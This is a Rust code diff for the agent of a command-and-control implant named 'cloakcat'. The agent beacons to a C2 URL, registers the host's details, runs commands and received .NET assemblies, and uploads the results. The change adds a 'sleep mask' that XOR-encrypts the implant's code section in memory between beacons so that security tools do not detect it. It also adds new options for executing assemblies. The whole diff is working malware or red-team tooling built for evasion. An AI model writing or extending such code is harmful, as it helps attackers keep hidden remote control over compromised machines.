@@ -8,6 +8,7 @@ macro_rules! debug_log {
 }
 
 use std::env;
+use std::sync::Arc;
 use std::time::Duration;
 
 use anyhow::Context;
@@ -22,6 +23,7 @@ use rand::Rng;
 use tokio::time::sleep;
 
 use crate::config::{load_agent_config, load_malleable_profile};
+use crate::evasion::sleep_mask::SleepMask;
 use crate::exec::run_command;
 use crate::host::{collect_hostname, collect_ip_addrs, collect_os_version, collect_username};
 use crate::tasks;
@@ -43,6 +45,23 @@ fn advance_backoff(current: Option<u64>, max_ms: u64) -> u64 {
     }
 }
 
+/// Sleep with optional sleep-mask.  When a `SleepMask` is active, the beacon's
+/// `.text` section is XOR-encrypted during the sleep interval and restored on
+/// wake.  The masked sleep blocks an OS thread, so it runs via `spawn_blocking`.
+async fn beacon_sleep(mask: &Option<Arc<SleepMask>>, duration: Duration) {
+    if let Some(m) = mask {
+        let m = Arc::clone(m);
+        let ms = duration.as_millis() as u32;
+        let _ = tokio::task::spawn_blocking(move || {
+            m.masked_sleep(ms);
+        })
+        .await;
+        return;
+    }
+    sleep(duration).await;
+}
+
+#[allow(clippy::too_many_arguments)]
 async fn upload_result<T: Transport>(
     transport: &T,
     result_url: &str,
@@ -187,7 +206,13 @@ async fn dispatch_task<T: Transport>(
             let asm_bytes = base64::engine::general_purpose::STANDARD
                 .decode(&task.assembly_b64)
                 .context("bad assembly base64")?;
-            tasks::assembly::execute_assembly(asm_bytes, task.args).await
+            tasks::assembly::execute_assembly(
+                asm_bytes,
+                task.args,
+                task.inline,
+                spawn_process.clone(),
+            )
+            .await
         }
     }
 }
@@ -230,6 +255,27 @@ pub async fn run() -> anyhow::Result<()> {
         let e = Endpoints::new(&cfg.c2_url, &cfg.profile_name, &agent_id);
         let t = HttpTransport::new(&*profile, &cfg.c2_url)?;
         (t, e)
+    };
+
+    // Initialise sleep mask if the malleable profile enables it.
+    let sleep_mask: Option<Arc<SleepMask>> = if malleable
+        .as_ref()
+        .and_then(|mp| mp.stage.as_ref())
+        .and_then(|s| s.sleep_mask)
+        .unwrap_or(false)
+    {
+        match SleepMask::new() {
+            Ok(m) => {
+                debug_log!("[agent] sleep mask enabled");
+                Some(Arc::new(m))
+            }
+            Err(e) => {
+                debug_log!("[agent] sleep mask init failed: {e}, continuing without");
+                None
+            }
+        }
+    } else {
+        None
     };
 
     let reg = cloakcat_protocol::RegisterReq {
@@ -286,7 +332,7 @@ pub async fn run() -> anyhow::Result<()> {
                 debug_log!("[agent] poll send error: {e} -> backoff");
                 let next = advance_backoff(backoff_ms, backoff_max);
                 backoff_ms = Some(next);
-                sleep(rand_between(next / 2, next)).await;
+                beacon_sleep(&sleep_mask, rand_between(next / 2, next)).await;
                 continue;
             }
         };
@@ -294,21 +340,21 @@ pub async fn run() -> anyhow::Result<()> {
         if status == 204 {
             debug_log!("[agent] poll: 204 no content -> sleep jitter");
             backoff_ms = None;
-            sleep(rand_between(beacon_min, beacon_max)).await;
+            beacon_sleep(&sleep_mask, rand_between(beacon_min, beacon_max)).await;
             continue;
         }
         if !(200..300).contains(&status) {
             debug_log!("[agent] poll error: {} -> sleep jitter", status);
             let next = advance_backoff(backoff_ms, backoff_max);
             backoff_ms = Some(next);
-            sleep(rand_between(next / 2, next)).await;
+            beacon_sleep(&sleep_mask, rand_between(next / 2, next)).await;
             continue;
         }
 
         let trimmed = text.trim();
         if trimmed == "{}" || trimmed.is_empty() {
             backoff_ms = None;
-            sleep(rand_between(beacon_min, beacon_max)).await;
+            beacon_sleep(&sleep_mask, rand_between(beacon_min, beacon_max)).await;
             continue;
         }
 
@@ -317,7 +363,7 @@ pub async fn run() -> anyhow::Result<()> {
             Err(e) => {
                 debug_log!("[agent] poll JSON parse error: {e}. raw={}", trimmed);
                 backoff_ms = None;
-                sleep(rand_between(beacon_min, beacon_max)).await;
+                beacon_sleep(&sleep_mask, rand_between(beacon_min, beacon_max)).await;
                 continue;
             }
         };
@@ -345,7 +391,7 @@ pub async fn run() -> anyhow::Result<()> {
             Some(c) => c,
             None => {
                 backoff_ms = None;
-                sleep(rand_between(beacon_min, beacon_max)).await;
+                beacon_sleep(&sleep_mask, rand_between(beacon_min, beacon_max)).await;
                 continue;
             }
         };
@@ -374,7 +420,7 @@ pub async fn run() -> anyhow::Result<()> {
                     debug_log!("[agent] result upload after task error failed: {e}");
                 }
                 backoff_ms = None;
-                sleep(rand_between(beacon_min, beacon_max)).await;
+                beacon_sleep(&sleep_mask, rand_between(beacon_min, beacon_max)).await;
                 continue;
             }
         };
@@ -402,13 +448,13 @@ pub async fn run() -> anyhow::Result<()> {
             debug_log!("[agent] result upload failed: {e} -> sleep jitter");
             let next = advance_backoff(backoff_ms, backoff_max);
             backoff_ms = Some(next);
-            sleep(rand_between(next / 2, next)).await;
+            beacon_sleep(&sleep_mask, rand_between(next / 2, next)).await;
             continue;
         } else {
             debug_log!("[agent] result uploaded: id={} ok", cmd.cmd_id);
         }
 
         backoff_ms = None;
-        sleep(rand_between(beacon_min, beacon_max)).await;
+        beacon_sleep(&sleep_mask, rand_between(beacon_min, beacon_max)).await;
     }
 }
